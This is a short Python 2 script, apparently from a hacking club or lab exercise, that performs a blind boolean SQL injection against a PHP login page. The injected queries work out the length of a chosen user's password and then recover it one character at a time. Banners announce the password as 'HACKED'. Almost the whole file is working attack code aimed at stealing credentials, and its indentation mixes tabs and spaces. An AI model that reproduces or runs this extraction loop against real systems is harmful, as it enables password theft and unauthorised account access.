# -*- coding : UTF-8 -*-
from requests import get
import string
from time import sleep

print(" _       __     __                             ___    ____  __________  _____    _       __           __    __")
print("| |     / /__  / /________  ____ ___  ___     /   |  / __ \/ ____/ __ \/ ___/   | |     / /___  _____/ /___/ /")
print("| | /| / / _ \/ / ___/ __ \/ __ `__ \/ _ \   / /| | / /_/ / / __/ / / /\__ \    | | /| / / __ \/ ___/ / __  / ")
print("| |/ |/ /  __/ / /__/ /_/ / / / / / /  __/  / ___ |/ _, _/ /_/ / /_/ /___/ /    | |/ |/ / /_/ / /  / / /_/ /  ")
print("|__/|__/\___/_/\___/\____/_/ /_/ /_/\___/  /_/  |_/_/ |_|\____/\____//____/     |__/|__/\____/_/  /_/\__,_/   ")
print("\n")
print("I can get your password. Take a look!")

input_id=""
input_id = raw_input("ID : ")

url = "http:///hackPage/login"

cookies = dict(PHPSESSID="")   
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""

print("First, Let's find out the length of the password!")

for i in range(1,20):
    parameter = "?userID="+input_id+"&password=1' or id='"+input_id+"' and LENGTH(password)=" + str(i) + "%23"
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("<h1>Hello ARGOS World!</h1>") > 0:
        length = i + 1
        print("password length is " + str(i)+"!! right??")
        break

print("\n\nNext, I will find at each word in the password!")
sleep(3)

print("\n\n.*.*.*.*.*.*.*.Finding Password.*.*.*.*.*.*.*.\n")
for i in range(1, length):
    for a in alpha:
        parameter = "?userID="+input_id+"&password=1' or id='"+input_id+"' AND ASCII(substr(password,"+ str(i)+",1))="+str(ord(a))+"%23"
        new_url = url + parameter
        r = get(new_url, cookies=cookies)

        if r.text.find("<h1>Hello ARGOS World!</h1>") > 0:
            print(str(i) + " -> " + a)
            sleep(1)
	    result += a
            break

    if i == 1 and result == "":
        print("password not found")
        exit(0)

    if i == length-1:
	print("\n")
	print("    __  _____   ________ __ __________     __             __  ____ __  _   __     ")
	print("   / / / /   | / ____/ //_// ____/ __ \   / /_  __  __   /  |/  (_) /_/ | / /_  __")
	print("  / /_/ / /| |/ /   / ,<  / __/ / / / /  / __ \/ / / /  / /|_/ / / __/  |/ / / / /")
	print(" / __  / ___ / /___/ /| |/ /___/ /_/ /  / /_/ / /_/ /  / /  / / / /_/ /|  / /_/ / ")
	print("/_/ /_/_/  |_\____/_/ |_/_____/_____/  /_.___/\__, /  /_/  /_/_/\__/_/ |_/\__, /  ")
	print("                                             /____/                      /____/   ")
	sleep(2)
        print("\n"+input_id+"'s password is " + result)
	print("\n")
